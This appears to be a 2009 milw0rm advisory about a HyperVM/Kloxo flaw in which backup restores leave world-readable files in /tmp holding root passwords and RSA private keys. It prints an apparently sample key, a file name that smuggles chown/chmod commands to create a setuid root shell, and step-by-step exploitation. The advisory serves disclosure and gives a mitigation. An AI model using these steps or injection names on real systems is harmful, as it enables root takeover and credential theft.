@@ -1,0 +1,93 @@
+HyperVM is a virtualization application that runs off a host node and can provide
+several Virtual Private Servers. There is a previously unreported vulnerability in
+HyperVM/Kloxo.
+
+It was originally documented in ISSUE 14 by an anonymous author:
+http://www.milw0rm.com/exploits/8880
+
+It turns out that he was showing how a root shell can be created:
+
+	[user1@testing574 tmp]$ ls -al
+	total 28
+	drwxrwxrwt  4 root  root  4096 May 21 08:41 .
+	drwxr-xr-x 24 root  root  4096 May 19 16:57 ..
+	-rw-rw-r--  1 user1 user1    0 May 21 08:40 ;cd ..;chown root.root shell;chmod 4755 shell;
+	drwx------  2 root  root  4096 May 21 08:41 backupPdUzR4
+	-rwsr-xr-x  1 root  root  5056 May 21 08:41 shell
+	-rw-rw-r--  1 user1 user1   89 May 21 08:33 shell.c
+
+This is pointless, because after a 'restore from backup' in HyperVM, it creates that folder
+"backupPdUzR4"
+
+Let's take a look at it...On a VM I tested, even the directory was readable.
+$ ls -lha /tmp/backupfileIy00MO/
+total 36K
+drwxr-xr-x 2 root root 4.0K Dec 12 02:18 .
+drwxr-xr-x 3 root root 4.0K Dec 12 10:37 ..
+-rw-r--r-- 1 root root  15K Dec 12 00:46 hypervm.file
+-rw-r--r-- 1 root root  11K Dec 12 00:46 hypervm.metadata
+
+World readable files. In it, root passwords in plain text. Including username, RSA private keys and lots more.
+
+Here the VM type is shown, it appears to be OpenVZ:
+$ cat hypervm.file
+al_list";a:0:{}s:13:"__object_list";N;s:9:"subaction";N;s:8:"dbaction";s:5:"clean";s:12:"metadbaction";s:3:"all";s:7:"__class";s:11:"vps__op
+envz";
+
+--snip--
+Private keys!
+"hostname";s:8:"fakevps";s:12:"use
+rname";s:10:"fakeusername";s:16:"text_private_key";s:887:"-----BEGIN RSA PRIVATE KEY-----
+FIICXZIBAAKBgQDdehG9ScmFWL3AZHeXqm2oljMRbyic7dlfGv9E3tMyWgWCSnF9
+dJ/gI+NoY1ygic52NJEAB1/blDtZMDnx3ze4wf79p9rGzAuT5N+yKqleMdlwozQC
+Lf17blSAQAXPi84Sy95huIMR9vZ/fPDOi7ucHWSk8aaqVI5JY8QpSewoVQIDAQAB
+AoGBAKVT7E4a+L38AmoHlWa4KGfCx5hqHC0ZODzQkGG+3HUn0hjyrUlzd6z/3VAd
+bBXDCUYf82XMY3h0bOElKPwvHw3+sgUyceSBONLa9pi+He/6ljwR0/LG6XjctdLH
+RwVNTEXY/JS15VRKyyXMdohhVbIXa3NjbMqvIBEJPmnjVlWBAkEA90xPi9te3HYj
+54uH7/+cEuZ9TlLyeB9+MQ0t7MfqNY1v2PRK+h4J6y4N+v43o9kkN7RGR3zd5Bww
+qP/TEfBL8QJBAOVFKGMwkY/2dhqKjnHC2rkN8B5Hn8Px2quf7SXn2tgnuZRYOxah
+WAtzdZSt64Vsaz+3fh6tIZ6YYQo/BYJMlqUCQD/UpIWPmZrCqJgVLn/n9kvu0xSh
+V1ZpkvNo2p1RMwamP+S7lIujq53aYuOUM5sKGM6ErMwR0VrtaCaI/N2ZspECQBZn
+P58Rq+epabkGOQ0cwUq79e6/iPkYtQl4QzAlC9kRF61LQdrgQT49NgwlQpJzGbfM
+TmLFADgDI9hgeCVXXpECQQC0c5owQrCx38xtZp6dydAccnHo4jrC83lRL6Epxueo
+i+3UYzuVxCQkBdhoF/5nsXv5Qh914MHGnH12qepPokyjd
+-----END RSA PRIVATE KEY-----
+";s:15:"text_public_key";s:1188:"-----BEGIN CERTIFICATE-----
+BIIDfPzCCAqigAwIBAgIBADANBgkqhkiG9w0BAQUFADB5MRMwEQYDNQDEwpseGxh
+YnMuY29tMQswCQYDVQQGEwJJTjELMAkGA1UECBMCaW4xCzAJBgNVBAcTAmluMQsw
+CQYDVQQKEwJseDENMAsGA1UECxMEc29mdDEfMB0GCSqGSIb3DQEJAUYQYWRtaW5A
+bHhsYWJzLmNvbTAeFw0wOTA2MTExMzAyNDdaFw0xMDA2MTExMzAyNDdaMHkxEzAR
+BgNVBAMTCmx4bGFicy9jb20xCzAJBgNVBAYTAklOMQswCQYDVQQIEwJpbjELMAkG
+Z2UEBxMCaW4xCzAJBgNVBAoTAmx4MQ0wCwYDVQQLEwRzb3Z0MR8wHQYJKoZIhvcN
+AQkBFhBhZG1pbkBseGxhYnMuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKB
+gQDdehG9ScmFWL2AZHeXqm2oljMRbyic7dlfGv9E3tMyWgWCSnF9dJ/gI+NoY1yg
+ic52NJEAB1/blDtZMDnx3ze4wf79p9rGzAuT5N+yKqleMdlwozQCLf17blSAQAXP
+i94Sy95huIMR9vZ/fPDOi7ucHWSk8aaqVI5JY7QpSewoVQIDAQABo4KWMIHTMB0G
+A1UdDgQWBBRMXffyd+fJWt/iYe1jteuLL8UukzCBowYDVR0jBIGbMIGYgBRMXffy
+d+fJWt/iYe1jteuLL8Uuk6F9pHsweTETMBEGA1UEAxMKbHhsYWJzLmNvbTELMAkG
+A1UEBhMCSU4xCzAJBgNVBAgTAmluMQswCQYDVQQHEwJpbjELMAkGA1UEChMCbHgx
+DTALBgNVBAsTBHNvZnQxHzAdBgkqhkiG9w0BCQEWEGFkbWluQGx4bGIicy5jb22C
+AQAwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOBgQCQnz/9DIzn5CVItRwk
+HHMZBLlq3MtmQYmwGuNjiss3UkYC1ehi9LDLfQ4AzJfjUrvBpuksozdfvYlpXnA1
+LAmOniBgyZW0aUStSrSr4czva4d3VMyOqQ/Dgr//i+RSuo4QH+6wI0G/oirE+E6b
+uR24why0WWPNsyJU3adesPo4eQf==
+-----END CERTIFICATE-----
+
+--snip--
+Root passwords!
+sable_reason";s:0:"";s:11:"createstage";s:0:"";s:13:"createmessage";s:0:"";s:12:"rootpassword";s:21:"xxxxxxxxxxxxxxxxxxxx";s:20:"rootpassword_changed";s
+
+So in summary, here are the exploitation steps:
+1. Log into HyperVM/Kloxo
+2. Click "Backup Home"
+3. In the field labeled "Restore from file", browse for any restore file from the popup box.
+4. Wait till the VM has finished restoring from backup.
+5. Login. If the root user hasn't deleted these files from /tmp/backupXXXXX before bringing up the network interface, you win.
+
+Mitigation:
+After the VM is restarted, manually delete these files as the root user before anyone else reads them.
+
+Regards,
+Xia Shing Zee
+
+# milw0rm.com [2009-08-25]
